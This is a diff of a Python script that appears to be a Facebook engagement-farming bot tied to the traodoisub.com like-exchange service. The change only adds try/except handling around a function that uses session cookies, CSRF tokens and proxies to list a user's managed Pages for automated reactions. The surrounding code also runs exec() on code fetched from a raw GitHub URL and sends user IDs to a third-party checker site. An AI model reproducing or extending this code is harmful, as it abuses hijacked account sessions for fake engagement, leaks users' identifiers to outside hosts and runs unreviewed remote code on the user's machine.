@@ -16,8 +16,6 @@ os.system('cls')
 
 exec(requests.get('https://raw.githubusercontent.com/Thuanvuse/filecode/main/logo').text)
 
-
-
 def GetTDS(tk,mk):
 	session = requests.Session()
 	rf_acc='https://traodoisub.com/view/cauhinh'
@@ -53,42 +51,45 @@ def cauhinh(idfb,tokentds,name,stt):
 		print(run['error'])
 		quit()
 def get_page(cookie,fb_dtsg,jazoest,proxies):
-	Broxus=proxies
-	uid=cookie.split("c_user=")[1].split(';')[0]
-	a=requests.get(f"https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id={uid}").text
-	print(f"[T] > FB | {uid} | {a.upper()} | " ,end='')
-	headers = {
-		'authority': 'mbasic.facebook.com',
-		'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-		'accept-language': 'vi,en;q=0.9,vi-VN;q=0.8,fr-FR;q=0.7,fr;q=0.6,en-US;q=0.5',
-		'cache-control': 'max-age=0',
-		'cookie': cookie,
-		'origin': 'https://www.facebook.com',
-		'referer': 'https://www.facebook.com',
-		'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
-		'sec-ch-ua-mobile': '?0',
-		'sec-ch-ua-platform': '"Windows"',
-		'sec-fetch-dest': 'document',
-		'sec-fetch-mode': 'navigate',
-		'sec-fetch-site': 'none',
-		'sec-fetch-user': '?1',
-		'upgrade-insecure-requests': '1',
-		'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
-	}
-	idpef = requests.post('https://www.facebook.com/api/graphql/', headers=headers, data={'fb_dtsg': fb_dtsg,'jazoest': jazoest,'variables': '{"showUpdatedLaunchpointRedesign":true,"useAdminedPagesForActingAccount":false,"useNewPagesYouManage":true}','doc_id': '5300338636681652'}, proxies=proxies, timeout=20).json()
-	a = idpef['data']['viewer']['actor']['profile_switcher_eligible_profiles']['nodes']
-	sl = 0
-	listcoolkie=[]
-	Name=[]
-	for b in a:
-		sl +=1
-		uid = b['profile']['id']
-		name = b['profile']['name']
-		delegate_page_id = b['profile']['delegate_page_id']
-		listcoolkie.append(f'{cookie}; i_user={uid}')
-		Name.append(name)
-	print(f'Có : {len(Name)} Page')
-	return listcoolkie,Name,Broxus,fb_dtsg,jazoest
+	try:
+
+		Broxus=proxies
+		uid=cookie.split("c_user=")[1].split(';')[0]
+		a=requests.get(f"https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id={uid}").text
+		print(f"[T] > FB | {uid} | {a.upper()} | " ,end='')
+		headers = {
+			'authority': 'mbasic.facebook.com',
+			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+			'accept-language': 'vi,en;q=0.9,vi-VN;q=0.8,fr-FR;q=0.7,fr;q=0.6,en-US;q=0.5',
+			'cache-control': 'max-age=0',
+			'cookie': cookie,
+			'origin': 'https://www.facebook.com',
+			'referer': 'https://www.facebook.com',
+			'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
+			'sec-ch-ua-mobile': '?0',
+			'sec-ch-ua-platform': '"Windows"',
+			'sec-fetch-dest': 'document',
+			'sec-fetch-mode': 'navigate',
+			'sec-fetch-site': 'none',
+			'sec-fetch-user': '?1',
+			'upgrade-insecure-requests': '1',
+			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
+		}
+		idpef = requests.post('https://www.facebook.com/api/graphql/', headers=headers, data={'fb_dtsg': fb_dtsg,'jazoest': jazoest,'variables': '{"showUpdatedLaunchpointRedesign":true,"useAdminedPagesForActingAccount":false,"useNewPagesYouManage":true}','doc_id': '5300338636681652'}, proxies=proxies, timeout=20).json()
+		a = idpef['data']['viewer']['actor']['profile_switcher_eligible_profiles']['nodes']
+		sl = 0
+		listcoolkie=[]
+		Name=[]
+		for b in a:
+			sl +=1
+			uid = b['profile']['id']
+			name = b['profile']['name']
+			delegate_page_id = b['profile']['delegate_page_id']
+			listcoolkie.append(f'{cookie}; i_user={uid}')
+			Name.append(name)
+		print(f'Có : {len(Name)} Page')
+		return listcoolkie,Name,Broxus,fb_dtsg,jazoest
+	except:pass
 def reaction(fb_dtsg,jazoest,cookies,id_post,type,PRX):
 	idfb=cookies.split('i_user=')[1].split(";")[0]
 	headers = {
@@ -175,14 +176,17 @@ for Input in Check_INPUT:
 		pr = proxy
 	choose = "http"
 	proxies = {"http": f"{choose}://{pr}" ,"https": f"{choose}://{pr}"}
-	ao,Name,Broxy,fb_dtsg,jazoest=get_page(cookie,fb_dtsg,jazoest,proxies)
-	for cookieLan1 in ao:
-		ALLCOOKIEPRO5.append(cookieLan1)
-	for Namez in Name:
-		ALLNAMEPRO5.append(Namez)
-		ALLPROXY.append(Broxy)
-		ALLTN1.append(fb_dtsg)
-		ALLTN2.append(jazoest)
+	try:
+		ao,Name,Broxy,fb_dtsg,jazoest=get_page(cookie,fb_dtsg,jazoest,proxies)
+		for cookieLan1 in ao:
+			ALLCOOKIEPRO5.append(cookieLan1)
+		for Namez in Name:
+			ALLNAMEPRO5.append(Namez)
+			ALLPROXY.append(Broxy)
+			ALLTN1.append(fb_dtsg)
+			ALLTN2.append(jazoest)
+	except:
+		print("Cookie Die !")
 Tfb=len(Check_INPUT)
 Tpro5=len(ALLNAMEPRO5)
 print(f'''
